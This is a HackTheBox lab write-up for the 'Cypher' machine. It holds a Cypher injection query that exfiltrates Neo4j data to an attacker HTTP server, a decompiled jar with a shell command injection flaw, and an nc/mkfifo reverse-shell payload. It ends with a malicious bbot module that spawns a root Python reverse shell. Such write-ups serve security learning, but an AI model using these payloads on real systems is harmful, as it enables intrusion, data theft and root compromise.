-------------

### CTF: HACKTHEBOX
### LAB-: CYPHER

-------------

![image](https://github.com/user-attachments/assets/98f18401-bf3e-4d72-af9a-48ef1777eaa8)

-------------

- Rustscan's output-:

```bash
❯ rustscan -a cypher.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.57:22
Open 10.10.11.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 08:43 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:43
Completed NSE at 08:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:43
Completed NSE at 08:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:43
Completed NSE at 08:43, 0.00s elapsed
Initiating Connect Scan at 08:43
Scanning cypher.htb (10.10.11.57) [2 ports]
Discovered open port 22/tcp on 10.10.11.57
Discovered open port 80/tcp on 10.10.11.57
Completed Connect Scan at 08:43, 0.20s elapsed (2 total ports)
Initiating Service scan at 08:44
Scanning 2 services on cypher.htb (10.10.11.57)
Completed Service scan at 08:44, 14.69s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.57.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:44
Completed NSE at 08:44, 7.12s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:44
Completed NSE at 08:44, 1.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:44
Completed NSE at 08:44, 0.00s elapsed
Nmap scan report for cypher.htb (10.10.11.57)
Host is up, received user-set (0.20s latency).
Scanned at 2025-03-27 08:43:58 WAT for 25s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Ffuf's output

![image](https://github.com/user-attachments/assets/ceee1d75-8398-4293-b3e3-925b6e6cdc41)

- I discovered this jar in which will later be explained.It is crucial in another stage.

![image](https://github.com/user-attachments/assets/87250fcc-9f25-45fe-84bd-e3e5deb27aff)

- I tested the login page with single quote and got this giant blob of error.

![image](https://github.com/user-attachments/assets/d0fb74a9-3e97-4bc1-8447-46e2a3fadc6d)

- Lets look at it closer with curl because notification box disappears after some seconds.

![image](https://github.com/user-attachments/assets/bb3610b1-c224-4c9b-9544-c050803b49ba)

- I discovered it is a neo4j database which is a graph type of  database.A graph database is defined as a specialized, single-purpose platform for creating and manipulating graphs. Graphs contain nodes, edges, and properties, all of which are used to represent and store data in a way that relational databases are not equipped to do as explained [here](https://www.oracle.com/ng/autonomous-database/what-is-graph-database/).I got an interesting [article](https://hackmd.io/@Chivato/rkAN7Q9NY#Fun-with-Cypher-Injections) to exploit it.The vulnerability is termed `cypher injection`.

---------------------

### Data exfiltration from neo4j db with SSRF [Rabbit hole]

----------------------

- A key method to exfiltrate nodes im a neo4j db is `SSRF`.Before exploiting and reading data, we have to read the nodes and this achieved through the `CALL data.labels()` function.First of all,set a python `http.server`,Query-:

```query
' OR 1=1 WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM 'http://[http server]/[point to an actual file]?help='+d AS y RETURN y//
```
- Result-:

![image](https://github.com/user-attachments/assets/ccc8a69c-14f6-4d86-88d2-7df6555bed74)

- Read nodes with -:
```query 
1' OR 1=1 WITH 1 as a MATCH (f:<node>) UNWIND keys(f) as p LOAD CSV FROM 'http://<server>/<point to a real file>?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

- Result for node `USER`,`SHA1`-:

![image](https://github.com/user-attachments/assets/1be00b57-3d91-43b0-aeaf-c609d019ce64)

- Rabbit hole concluded
- Cypher allows installation of custom functions and the jar file provided by the challenge creators is a custom function tagged as APOC [here](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits).I decompiled the jar file  with a site and this is the output.

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
         url = "https://" + url;
      }

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

      String line;
      while((line = errorReader.readLine()) != null) {
         errorOutput.append(line).append("\n");
      }

      String statusCode = inputReader.readLine();
      System.out.println("Status code: " + statusCode);
      boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
      if (!exited) {
         process.destroyForcibly();
         statusCode = "0";
         System.err.println("Process timed out after 10 seconds");
      } else {
         int exitCode = process.exitValue();
         if (exitCode != 0) {
            statusCode = "0";
            System.err.println("Process exited with code " + exitCode);
         }
      }

      if (errorOutput.length() > 0) {
         System.err.println("Error output:\n" + errorOutput.toString());
      }

      return Stream.of(new CustomFunctions.StringOutput(statusCode));
   }

   public static class StringOutput {
      public String statusCode;

      public StringOutput(String statusCode) {
         this.statusCode = statusCode;
      }
   }
}
```

- The snippet below is vulnerable to command injection because the url argument used by the custom function `custom.getUrlStatusCode` is passed to a shell statement.We can end the statement with `;` and trigger our arbitrary statement.The statement is a curl statement being executed by the `sh` binary.

```java
 String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

      String line;
```

- POC to pop a rev shell-:

```neo4j
1' OR 1=1 WITH 1337 AS x CALL custom.getUrlStatusCode('http://10.10.14.84:8002/zz?id=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.84 8001 >/tmp/f`') YIELD statusCode LOAD CSV FROM 'http://10.10.14.84:8002/zz?statuscode='+statusCode AS y RETURN y//
```

![image](https://github.com/user-attachments/assets/2e51741c-e513-43cb-9be9-e38d25b9b6fa)

![image](https://github.com/user-attachments/assets/8c81c787-16db-4a85-b982-59dd93e208b5)

- I ran linpeas.sh and discovered this password which works fors for user `graphasm`.

![image](https://github.com/user-attachments/assets/004270a0-10a8-4c15-bb8d-b4a6bdfa5c88)

- User `graphasm`-:

![image](https://github.com/user-attachments/assets/f4c10ba2-47ec-4ccd-8210-a76b16922c10)

---------------

### Arbitrary Code Execution in  bbot

----------------

- I checked if user `graphasm` can run a binary with as root with `sudo -l`.I discovered the graphasm can do that with `bbot` binary.

![image](https://github.com/user-attachments/assets/92e40bcf-c2f9-4785-bc9b-f4fa06b92bf9)

- Bbot is a bug bounty tool for enumeration.I dived into the documentation to check for features that we can use for privilege escalation e.g file write.file read and scripts code execution.Then, I discovered this feature that allows us load custom modules writtnen with python.
This [article](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) in the documentation explains how to go about it.We can abuse this feature to execute code.The malicious module is named `dirty` and the code snippet is the poc.It imports `os` and uses the `system()` function to trigger a python reverse shell.

```python
import os
from bbot.modules.base import BaseModule

payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.84\",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
class dirty(BaseModule):
     print("I ran your dirty exploit,sensei!!!!")
     os.system(payload)
```

- Before a module can be loaded,you need to specify the custom directory to it is located because all modules should be in `bbot/modules` and we don't have write access to it.The snippet should be added to the `yaml` file.In my own case,it will be `/home/graphasm`.

```yaml
module_dirs:
  - /home/graphasm
```

- I edited the `bbot_preset.yml` file.

![image](https://github.com/user-attachments/assets/97017b8d-dcbb-40ce-8bd5-8c4504aea3fc)

- `Dirty.py created`-:

![image](https://github.com/user-attachments/assets/edd48d49-d108-49af-971e-051bfe498a2d)

- To run a custom preset, use `-p` and specify the absolute path,`-m` should hold the module name.

![image](https://github.com/user-attachments/assets/2f2fd218-119f-4a79-830b-6cdb657fc0fb)

- Root-:

![image](https://github.com/user-attachments/assets/020a7fd5-e6cf-4608-ab35-6fee5a1775bc)

-------------

### References-:

----------------

- [Cypher Injection](https://hackmd.io/@Chivato/rkAN7Q9NY#Fun-with-Cypher-Injections)
- [More on CYpher Injection](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits)
- [Modules creation for Bbot](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/)

-----------------






